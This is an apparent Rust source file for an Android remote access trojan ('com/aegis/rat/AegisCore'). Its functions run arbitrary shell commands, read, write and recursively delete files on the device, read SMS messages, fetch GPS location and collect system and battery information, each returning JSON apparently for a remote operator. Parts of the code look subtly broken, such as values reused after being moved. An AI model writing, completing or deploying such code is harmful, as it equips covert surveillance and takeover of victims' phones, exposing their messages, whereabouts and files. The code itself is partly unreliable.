use serde_json::{json, Value};
use std::fs;

/// Attaches to the JVM and calls a static method on AegisCore.
/// Returns the resulting String from the Java method.
fn call_java_static(env: &jni::JNIEnv, method_name: &str, signature: &str, args: Vec<jni::objects::JValueGen>) -> Result<String, String> {
    let class = env.get_class("com/aegis/rat/AegisCore")
        .map_err(|e| format!("Failed to get AegisCore class: {}", e))?;
    
    let result = env.call_static_method(&class, method_name, signature, &args)
        .map_err(|e| format!("Failed to call {}: {}", method_name, e))?;
        
    let jstring = result.l()
        .map_err(|e| format!("Failed to get result string: {}", e))?;
        
    let rust_str: String = env.get_string(&jstring)
        .map_err(|e| format!("Failed to convert string: {}", e))?
        .into();
        
    Ok(rust_str)
}

/// Helper to get the stored Android Context.
fn get_context() -> Result<jni::objects::JObject, String> {
    let context = crate::CONTEXT.lock().unwrap();
    context.as_ref().cloned().ok_or_else(|| "Context not initialized".to_string())
}

/// Attaches the current thread to the JVM.
fn attach_jvm() -> Result<jni::JNIEnv, String> {
    crate::attach_jvm()
}

// --- SHELL EXECUTION (REAL) ---

/// Executes a shell command using the Android `sh` (mksh) shell.
/// This allows running any system command: ls, cat, ps, dumpsys, etc.
pub fn execute_shell(script: &str) -> Value {
    if script.is_empty() {
        return json!({"error": "Empty script"});
    }

    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg(script)
        .output();

    match output {
        Ok(o) => json!({
            "stdout": String::from_utf8_lossy(&o.stdout),
            "stderr": String::from_utf8_lossy(&o.stderr),
            "code": o.status.code()
        }),
        Err(e) => json!({"error": format!("Failed to execute shell: {}", e)})
    }
}

// --- FILESYSTEM (REAL) ---

/// Maps a path to the correct Android storage path.
/// Handles Scoped Storage by mapping /sdcard to /storage/emulated/0
fn resolve_path(path: &str) -> String {
    if path.starts_with("/sdcard") {
        path.replace("/sdcard", "/storage/emulated/0")
    } else if path.starts_with("/storage") {
        path.to_string()
    } else {
        // If it's a relative path, assume it's in the app's private dir or /data/local/tmp
        // For simplicity, we treat it as an absolute path or prepend /storage/emulated/0
        if path.starts_with('/') {
            path.to_string()
        } else {
            format!("/storage/emulated/0/{}", path)
        }
    }
}

pub fn list_files(path: &str) -> Value {
    let target_path = resolve_path(path);
    let entries = fs::read_dir(target_path);
    match entries {
        Ok(dir) => {
            let files: Vec<Value> = dir.filter_map(|entry| {
                entry.ok().map(|e| {
                    json!({
                        "name": e.file_name().to_string_lossy(),
                        "path": e.path().to_string_lossy(),
                        "is_dir": e.path().is_dir()
                    })
                })
            }).collect();
            json!({"path": target_path, "files": files})
        }
        Err(e) => json!({"error": format!("Failed to list directory {}: {}", target_path, e)})
    }
}

pub fn read_file(path: &str) -> Value {
    let target_path = resolve_path(path);
    match fs::read_to_string(target_path) {
        Ok(c) => json!({"path": target_path, "content": c}),
        Err(e) => json!({"error": format!("Failed to read file {}: {}", target_path, e)})
    }
}

pub fn write_file(path: &str, content: &str) -> Value {
    let target_path = resolve_path(path);
    match fs::write(target_path, content) {
        Ok(_) => json!({"status": "ok", "path": target_path}),
        Err(e) => json!({"error": format!("Failed to write file {}: {}", target_path, e)})
    }
}

pub fn delete_file(path: &str) -> Value {
    let target_path = resolve_path(path);
    // Try file first, then directory
    match fs::remove_file(target_path) {
        Ok(_) => json!({"status": "ok", "path": target_path}),
        Err(_) => {
            match fs::remove_dir_all(target_path) {
                Ok(_) => json!({"status": "ok", "path": target_path, "type": "directory"}),
                Err(e) => json!({"error": format!("Failed to delete {}: {}", target_path, e)})
            }
        }
    }
}

// --- TELECOM & SENSORS (REAL VIA JAVA BRIDGE) ---

pub fn read_sms(args: &Value) -> Value {
    let limit = args.get("limit").and_then(|s| s.as_u64()).unwrap_or(10) as i32;
    
    // 1. Get Context
    let context = match get_context() {
        Ok(c) => c,
        Err(e) => return json!({"error": e, "messages": vec![]}),
    };

    // 2. Attach to JVM
    let env = match attach_jvm() {
        Ok(e) => e,
        Err(e) => return json!({"error": e, "messages": vec![]}),
    };

    // 3. Call Java Method
    // Java Signature: public static String nativeReadSms(Context context, int limit)
    let result = call_java_static(
        &env,
        "nativeReadSms",
        "(Landroid/content/Context;I)Ljava/lang/String;",
        vec![&context.into(), &limit.into()]
    );

    match result {
        Ok(sms_str) => {
            // Parse the JSON string from Java into a Value
            serde_json::from_str(&sms_str).unwrap_or(json!({"error": "Failed to parse SMS JSON", "messages": vec![]}))
        }
        Err(e) => json!({"error": e, "messages": vec![]})
    }
}

pub fn get_location(args: &Value) -> Value {
    // 1. Get Context
    let context = match get_context() {
        Ok(c) => c,
        Err(e) => return json!({"error": e}),
    };

    // 2. Attach to JVM
    let env = match attach_jvm() {
        Ok(e) => e,
        Err(e) => return json!({"error": e}),
    };

    // 3. Call Java Method
    // Java Signature: public static String nativeGetRealLocation(Context context)
    let result = call_java_static(
        &env,
        "nativeGetRealLocation",
        "(Landroid/content/Context;)Ljava/lang/String;",
        vec![&context.into()]
    );

    match result {
        Ok(loc_str) => {
            // Parse the JSON string from Java into a Value
            serde_json::from_str(&loc_str).unwrap_or(json!({"error": "Failed to parse Location JSON"}))
        }
        Err(e) => json!({"error": e})
    }
}

pub fn get_battery(_args: &Value) -> Value {
    // 1. Get Context
    let context = match get_context() {
        Ok(c) => c,
        Err(e) => return json!({"error": e}),
    };

    // 2. Attach to JVM
    let env = match attach_jvm() {
        Ok(e) => e,
        Err(e) => return json!({"error": e}),
    };

    // 3. Call Java Method
    // Java Signature: public static String nativeGetBattery(Context context)
    let result = call_java_static(
        &env,
        "nativeGetBattery",
        "(Landroid/content/Context;)Ljava/lang/String;",
        vec![&context.into()]
    );

    match result {
        Ok(batt_str) => {
            // Parse the JSON string from Java into a Value
            serde_json::from_str(&batt_str).unwrap_or(json!({"error": "Failed to parse Battery JSON"}))
        }
        Err(e) => json!({"error": e})
    }
}

// --- SYSTEM INFO (REAL) ---

pub fn get_system_info() -> Value {
    // This calls the Java side to get real system info
    let context = match get_context() {
        Ok(c) => c,
        Err(e) => return json!({"error": e}),
    };

    let env = match attach_jvm() {
        Ok(e) => e,
        Err(e) => return json!({"error": e}),
    };

    // Java Signature: public static String nativeGetSystemInfo(Context context)
    // You need to add this method to AegisCore.java as well.
    // For now, we will return a basic info using existing statics if available, 
    // or call a new Java method.
    // Let's assume we have a nativeGetSystemInfo method.
    
    let result = call_java_static(
        &env,
        "nativeGetSystemInfo",
        "(Landroid/content/Context;)Ljava/lang/String;",
        vec![&context.into()]
    );

    match result {
        Ok(info_str) => serde_json::from_str(&info_str).unwrap_or(json!({"error": "Failed to parse System Info JSON"})),
        Err(e) => json!({"error": e})
    }
}
